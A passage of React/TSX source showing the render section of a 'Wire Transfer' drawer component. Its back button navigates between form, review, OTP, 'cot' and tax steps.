      <DrawerContent className="max-h-[95vh]">
        <DrawerHeader className="border-b pb-4">
          <div className="flex items-center gap-3">
            {currentStep !== "form" && currentStep !== "processing" && currentStep !== "complete" && (
              <Button
                variant="ghost"
                size="icon"
                onClick={() => {
                  if (currentStep === "review") setCurrentStep("form")
                  else if (currentStep === "otp") setCurrentStep("review")
                  else if (currentStep === "cot") setCurrentStep("otp")
                  else if (currentStep === "tax") setCurrentStep("cot")
                }}
              >
                <ArrowLeft className="h-5 w-5" />
              </Button>
            )}
            <DrawerTitle className="text-[#0a4fa6]">Wire Transfer</DrawerTitle>
          </div>
        </DrawerHeader>

        {renderStepIndicator()}

        <div className="flex-1 overflow-y-auto max-h-[calc(95vh-200px)]">{renderContent()}</div>

        {renderFooter()}
      </DrawerContent>
    </Drawer>
  )
}
